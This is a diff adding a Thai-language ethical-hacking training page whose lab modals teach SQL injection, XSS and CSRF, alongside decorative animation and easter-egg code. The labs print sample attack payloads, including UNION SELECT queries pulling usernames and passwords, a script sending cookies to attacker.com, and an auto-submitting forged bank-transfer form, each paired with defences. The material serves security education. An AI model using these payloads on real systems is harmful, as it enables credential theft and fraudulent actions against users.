+                    <div class="space-y-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <h4 class="font-semibold text-blue-800 mb-2">🎯 วัตถุประสงค์</h4>
+                            <p class="text-blue-700">เรียนรู้การค้นหาและใช้ประโยชน์จากช่องโหว่ SQL Injection</p>
+                        </div>
+
+                        <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4">
+                            <h4 class="font-semibold text-yellow-800 mb-2">⚠️ คำเตือน</h4>
+                            <p class="text-yellow-700">ใช้เฉพาะในสภาพแวดล้อมทดสอบเท่านั้น ห้ามใช้กับระบบจริง</p>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">📋 ขั้นตอนการทำแล็บ</h4>
+                            <ol class="list-decimal list-inside space-y-2 text-gray-700">
+                                <li>ตรวจสอบ input field ที่อาจมีช่องโหว่</li>
+                                <li>ทดสอบด้วย payload พื้นฐาน: <code class="bg-gray-200 px-2 py-1 rounded">' OR '1'='1</code></li>
+                                <li>ใช้ UNION SELECT เพื่อดึงข้อมูลจากตารางอื่น</li>
+                                <li>ระบุจำนวนคอลัมน์ด้วย ORDER BY</li>
+                                <li>ดึงข้อมูลสำคัญจากฐานข้อมูล</li>
+                            </ol>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">💡 Payload ตัวอย่าง</h4>
+                            <div class="code-block p-4 text-green-400 font-mono text-sm">
+                                <div class="mb-2"># ทดสอบช่องโหว่พื้นฐาน</div>
+                                <div>' OR 1=1--</div>
+                                <div>' OR 'a'='a</div>
+                                <div class="mt-4 mb-2"># ดึงข้อมูลด้วย UNION</div>
+                                <div>' UNION SELECT username, password FROM users--</div>
+                                <div>' UNION SELECT 1,2,3,4--</div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🛡️ วิธีป้องกัน</h4>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700">
+                                <li>ใช้ Prepared Statements</li>
+                                <li>Validate และ Sanitize input</li>
+                                <li>ใช้ Stored Procedures</li>
+                                <li>จำกัดสิทธิ์ฐานข้อมูล</li>
+                                <li>ใช้ Web Application Firewall (WAF)</li>
+                            </ul>
+                        </div>
+
+                        <div class="bg-gray-50 p-4 rounded-lg">
+                            <h4 class="font-semibold mb-2">📚 แหล่งอ้างอิง</h4>
+                            <ul class="text-sm text-gray-600 space-y-1">
+                                <li>• OWASP SQL Injection Prevention Cheat Sheet</li>
+                                <li>• PortSwigger SQL Injection Labs</li>
+                                <li>• SANS SQL Injection Guide</li>
+                            </ul>
+                        </div>
+                    </div>
+                `
+            },
+            'xss': {
+                title: 'Cross-Site Scripting (XSS) Lab',
+                content: `
+                    <div class="space-y-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <h4 class="font-semibold text-blue-800 mb-2">🎯 วัตถุประสงค์</h4>
+                            <p class="text-blue-700">เรียนรู้การโจมตี XSS และวิธีป้องกัน</p>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🔍 ประเภทของ XSS</h4>
+                            <div class="grid md:grid-cols-3 gap-4">
+                                <div class="bg-red-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-red-800">Reflected XSS</h5>
+                                    <p class="text-sm text-red-700 mt-2">Payload ถูกส่งกลับในการตอบสนองทันที</p>
+                                </div>
+                                <div class="bg-orange-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-orange-800">Stored XSS</h5>
+                                    <p class="text-sm text-orange-700 mt-2">Payload ถูกเก็บในฐานข้อมูล</p>
+                                </div>
+                                <div class="bg-purple-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-purple-800">DOM XSS</h5>
+                                    <p class="text-sm text-purple-700 mt-2">Payload ทำงานผ่าน DOM manipulation</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">💡 Payload ตัวอย่าง</h4>
+                            <div class="code-block p-4 text-green-400 font-mono text-sm">
+                                <div class="mb-2"># Basic XSS</div>
+                                <div>&lt;script&gt;alert('XSS')&lt;/script&gt;</div>
+                                <div class="mt-4 mb-2"># Cookie Stealing</div>
+                                <div>&lt;script&gt;document.location='http://attacker.com/steal.php?cookie='+document.cookie&lt;/script&gt;</div>
+                                <div class="mt-4 mb-2"># Bypass Filters</div>
+                                <div>&lt;img src=x onerror=alert('XSS')&gt;</div>
+                                <div>&lt;svg onload=alert('XSS')&gt;</div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🛡️ วิธีป้องกัน</h4>
+                            <ul class="list-disc list-inside space-y-2 text-gray-700">
+                                <li>Input Validation และ Output Encoding</li>
+                                <li>ใช้ Content Security Policy (CSP)</li>
+                                <li>HttpOnly Cookies</li>
+                                <li>X-XSS-Protection Header</li>
+                                <li>ใช้ Template Engine ที่ปลอดภัย</li>
+                            </ul>
+                        </div>
+
+                        <div class="bg-gray-50 p-4 rounded-lg">
+                            <h4 class="font-semibold mb-2">📚 แหล่งอ้างอิง</h4>
+                            <ul class="text-sm text-gray-600 space-y-1">
+                                <li>• OWASP XSS Prevention Cheat Sheet</li>
+                                <li>• PortSwigger XSS Labs</li>
+                                <li>• Mozilla Developer Network - CSP Guide</li>
+                            </ul>
+                        </div>
+                    </div>
+                `
+            },
+            'csrf': {
+                title: 'Cross-Site Request Forgery (CSRF) Lab',
+                content: `
+                    <div class="space-y-6">
+                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4">
+                            <h4 class="font-semibold text-blue-800 mb-2">🎯 วัตถุประสงค์</h4>
+                            <p class="text-blue-700">เรียนรู้การโจมตี CSRF และการป้องกัน</p>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🔍 CSRF คืออะไร?</h4>
+                            <p class="text-gray-700 mb-4">
+                                CSRF เป็นการโจมตีที่บังคับให้ผู้ใช้ที่ล็อกอินแล้วทำการกระทำที่ไม่ต้องการ
+                                โดยไม่รู้ตัว ผ่านเว็บไซต์ที่เป็นอันตราย
+                            </p>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">💡 ตัวอย่างการโจมตี</h4>
+                            <div class="code-block p-4 text-green-400 font-mono text-sm">
+                                <div class="mb-2"># HTML Form Attack</div>
+                                <div>&lt;form action="https://bank.com/transfer" method="POST"&gt;</div>
+                                <div>  &lt;input type="hidden" name="to" value="attacker"&gt;</div>
+                                <div>  &lt;input type="hidden" name="amount" value="1000"&gt;</div>
+                                <div>&lt;/form&gt;</div>
+                                <div>&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</div>
+                                <div class="mt-4 mb-2"># Image Tag Attack</div>
+                                <div>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🛡️ วิธีป้องกัน</h4>
+                            <div class="space-y-4">
+                                <div class="bg-green-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-green-800 mb-2">CSRF Tokens</h5>
+                                    <p class="text-green-700 text-sm">ใช้ token ที่ไม่สามารถคาดเดาได้ในทุก form</p>
+                                </div>
+                                <div class="bg-blue-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-blue-800 mb-2">SameSite Cookies</h5>
+                                    <p class="text-blue-700 text-sm">ตั้งค่า SameSite attribute ใน cookies</p>
+                                </div>
+                                <div class="bg-purple-50 p-4 rounded-lg">
+                                    <h5 class="font-semibold text-purple-800 mb-2">Referer Validation</h5>
+                                    <p class="text-purple-700 text-sm">ตรวจสอบ Referer header</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div>
+                            <h4 class="text-lg font-semibold mb-3">🔧 การทดสอบ CSRF</h4>
+                            <ol class="list-decimal list-inside space-y-2 text-gray-700">
+                                <li>ระบุ sensitive functions (เช่น การโอนเงิน, เปลี่ยนรหัสผ่าน)</li>
+                                <li>ตรวจสอบว่ามี CSRF protection หรือไม่</li>
+                                <li>สร้าง malicious page ที่ส่ง request</li>
+                                <li>ทดสอบการโจมตีในสภาพแวดล้อมที่ปลอดภัย</li>
+                            </ol>
+                        </div>
+
+                        <div class="bg-gray-50 p-4 rounded-lg">
+                            <h4 class="font-semibold mb-2">📚 แหล่งอ้างอิง</h4>
+                            <ul class="text-sm text-gray-600 space-y-1">
+                                <li>• OWASP CSRF Prevention Cheat Sheet</li>
+                                <li>• PortSwigger CSRF Labs</li>
+                                <li>• RFC 7034 - X-Frame-Options</li>
+                            </ul>
+                        </div>
+                    </div>
+                `
+            }
+        };
+
+        // Matrix background animation
+        function initMatrix() {
+            const canvas = document.getElementById('matrix-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const matrix = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%+-/~{[|`]}";
+            const matrixArray = matrix.split("");
+            
+            const fontSize = 10;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for(let x = 0; x < columns; x++) {
+                drops[x] = 1;
+            }
+            
+            function draw() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = matrixArray[Math.floor(Math.random() * matrixArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(draw, 35);
+        }
+        
+        // Easter egg system
+        let easterEggCount = 0;
+        const totalEasterEggs = 5;
+        
+        function revealEasterEgg(eggId) {
+            const egg = document.getElementById(eggId);
+            if (egg && !egg.classList.contains('revealed')) {
+                egg.classList.add('revealed');
+                easterEggCount++;
+                
+                // Play sound effect (visual feedback)
+                const button = event.target;
+                button.style.transform = 'scale(0.95)';
+                setTimeout(() => {
+                    button.style.transform = 'scale(1)';
+                }, 100);
+                
+                if (easterEggCount === totalEasterEggs) {
+                    setTimeout(() => {
+                        alert('🎉 ยินดีด้วย! คุณพบ Easter Egg ครบทั้ง 5 ตัวแล้ว!\n\nคุณได้รับตำแหน่ง: Master Ethical Hacker 🏆');
+                    }, 500);
+                }
+            }
+        }
+        
+        // Konami Code Easter Egg
+        let konamiCode = [];
+        const konamiSequence = [38, 38, 40, 40, 37, 39, 37, 39, 66, 65]; // ↑↑↓↓←→←→BA
+        
+        function showKonamiCode() {
+            alert('🎮 ลองกดปุ่มลูกศรตามลำดับ: ↑↑↓↓←→←→BA แล้วกด Enter!');
+        }
+        
+        document.addEventListener('keydown', function(e) {
+            konamiCode.push(e.keyCode);
+            
+            if (konamiCode.length > konamiSequence.length) {
+                konamiCode.shift();
+            }
+            
+            if (konamiCode.length === konamiSequence.length) {
+                let match = true;
+                for (let i = 0; i < konamiSequence.length; i++) {
+                    if (konamiCode[i] !== konamiSequence[i]) {
+                        match = false;
+                        break;
+                    }
+                }
+                
+                if (match && e.keyCode === 13) { // Enter key
+                    document.body.style.animation = 'glitch 0.5s infinite';
+                    setTimeout(() => {
+                        document.body.style.animation = '';
+                        alert('🎊 KONAMI CODE ACTIVATED!\n\nSecret Developer Mode Unlocked!\nAll Easter Eggs revealed!');
+                        
+                        // Reveal all easter eggs
+                        document.querySelectorAll('.easter-egg').forEach(egg => {
+                            egg.classList.add('revealed');
+                        });
+                        easterEggCount = totalEasterEggs;
+                    }, 2000);
+                }
+            }
+        });
+
+        // Navigation functions
+        function showSection(sectionName, btn) {
+            // Hide all sections
+            document.querySelectorAll('.section').forEach(section => {
+                section.classList.add('hidden');
+            });
+            
+            // Show selected section
+            document.getElementById(sectionName + '-section').classList.remove('hidden');
+            
+            // Update navigation buttons
+            document.querySelectorAll('.nav-btn').forEach(b => {
+                b.classList.remove('bg-gray-800', 'text-green-400', 'border-green-400/30');
+                b.classList.add('hover:bg-gray-800', 'text-gray-300', 'border-gray-600');
+            });
+
+            if(btn){
+                btn.classList.add('bg-gray-800', 'text-green-400', 'border-green-400/30');
+                btn.classList.remove('hover:bg-gray-800', 'text-gray-300', 'border-gray-600');
+            }
+        }
+
+        // Lab modal functions and badge/easter-egg tracking
+        const openedLabs = new Set();
+        const badgeRequirements = new Set(['sql-injection','xss','csrf']); // labs needed to unlock badge
+
+        function showLab(labId) {
+            const lab = labData[labId];
+            if (lab) {
+                document.getElementById('lab-title').textContent = lab.title;
+                document.getElementById('lab-content').innerHTML = lab.content;
+                document.getElementById('lab-modal').classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+
+                // Track opened labs for the Easter Egg
+                openedLabs.add(labId);
+                checkForBadgeUnlock();
+            }
+        }
+
+        function closeLab() {
+            document.getElementById('lab-modal').classList.add('hidden');
+            document.body.style.overflow = 'auto';
+        }
+
+        function checkForBadgeUnlock() {
+            // if all required labs are opened, reveal the badge UI
+            const badgeEl = document.getElementById('lab-badge');
+            const allOpened = [...badgeRequirements].every(r => openedLabs.has(r));
+            if (allOpened) {
+                badgeEl.classList.add('revealed');
+                badgeEl.setAttribute('aria-hidden','false');
+                badgeEl.innerHTML = '<p class="text-sm terminal-green">🏅 Lab Explorer: ปลดล็อกแล้ว! คลิกเพื่อรับ</p>';
+            }
+        }
+
+        function claimLabBadge() {
+            const badgeEl = document.getElementById('lab-badge');
+            if (!badgeEl.classList.contains('revealed')) {
+                // small tease
+                badgeEl.classList.add('revealed');
+                badgeEl.innerHTML = '<p class="text-sm terminal-yellow">🔒 ปลดล็อกได้โดยทำครบชุดแล็บหลัก (SQL, XSS, CSRF)</p>';
+                setTimeout(() => { badgeEl.classList.remove('revealed'); badgeEl.innerHTML = '<p class="text-sm terminal-green">🏅 Lab Explorer: คลิกเพื่อรับรางวัลเมื่อปลดล็อก</p>'; }, 2000);
+                return;
+            }
+
+            // Show a small modal / toast to congratulate
+            alert('🎉 ยินดีด้วย! คุณปลดล็อก Lab Explorer Badge: Master of Web Defenses 🛡️');
+            // mark badge as claimed (prevent re-claiming during session)
+            badgeEl.classList.remove('revealed');
+            badgeEl.innerHTML = '<p class="text-sm terminal-green">✅ Badge ได้รับแล้ว</p>';
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('lab-modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeLab();
+            }
+        });
+
+        // Keyboard navigation
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape') {
+                closeLab();
+            }
+        });
+        
+        // Initialize matrix background when page loads
+        window.addEventListener('load', function() {
+            initMatrix();
+            // default to web section and mark first nav button active
+            const firstNav = document.querySelector('.nav-btn');
+            if(firstNav) showSection('web', firstNav);
+        });
+        
+        // Resize matrix canvas when window resizes
+        window.addEventListener('resize', function() {
+            const canvas = document.getElementById('matrix-canvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'97cfdb9057f110d6',t:'MTc1NzUxNzA4NC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>
+</html>
